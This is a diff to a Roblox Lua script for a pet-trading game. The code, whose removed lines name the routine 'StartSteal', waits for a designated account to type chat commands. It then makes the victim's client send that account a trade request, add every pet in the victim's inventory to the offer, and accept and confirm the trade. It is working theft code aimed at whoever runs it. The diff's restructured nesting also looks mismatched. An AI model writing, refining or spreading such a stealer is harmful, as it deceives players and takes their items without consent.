@@ -101,11 +101,12 @@ local function SendTrade()
   local Loads = require(game.ReplicatedStorage.Fsys).load
   local RouterClient = Loads("RouterClient")
   local send_trade = RouterClient.get("TradeAPI/SendTradeRequest")
+        send_trade:FireServer(game.Players[Username])
 
-  send_trade:FireServer(game.Players[Username])
-
-wait(4)
-local Loads = require(game.ReplicatedStorage.Fsys).load
+  local TradeAccepted = RouterClient.get("TradeAPI/TradeAccepted")
+        TradeAccepted.OnClientEvent:Connect(function()
+wait(3)
+  local Loads = require(game.ReplicatedStorage.Fsys).load
   local RouterClient = Loads("RouterClient")
   local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
   local juj = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
@@ -127,20 +128,18 @@ local Loads = require(game.ReplicatedStorage.Fsys).load
   else
     print("No pets found in inventory.")
   end
-wait(6)
-local Loads = require(game.ReplicatedStorage.Fsys).load
+
+local function AcceptTrade()
+  local Loads = require(game.ReplicatedStorage.Fsys).load
   local RouterClient = Loads("RouterClient")
   local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
   AcceptNegotiationRemote:FireServer()
-wait(17)
-local Loads = require(game.ReplicatedStorage.Fsys).load
+end
+local function ConfirmTrade()
+  local Loads = require(game.ReplicatedStorage.Fsys).load
   local RouterClient = Loads("RouterClient")
   local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
   AcceptTradeRemote:FireServer()
-end
-
-local function StartSteal()
-        SendTrade()
 end
 
 local total_pets = 0
@@ -160,9 +159,17 @@ game.Players.PlayerAdded:Connect(function(player)
   if player.Name == Username then
       player.Chatted:Connect(function(msg)
           local lowerMsg = msg:lower()
-          if lowerMsg == "/start" or lowerMsg == "start" then
-            StartSteal()
+          if lowerMsg == "/send" or lowerMsg == "send" then
+            SendTrade()
+          end
+          if lowerMsg == "/accept" or lowerMsg == "accept" then
+            AcceptTrade()
+          end
+          if lowerMsg == "/confirm" or lowerMsg == "confirm" then
+            ConfirmTrade()
           end
       end)
   end
 end)
+end)
+end
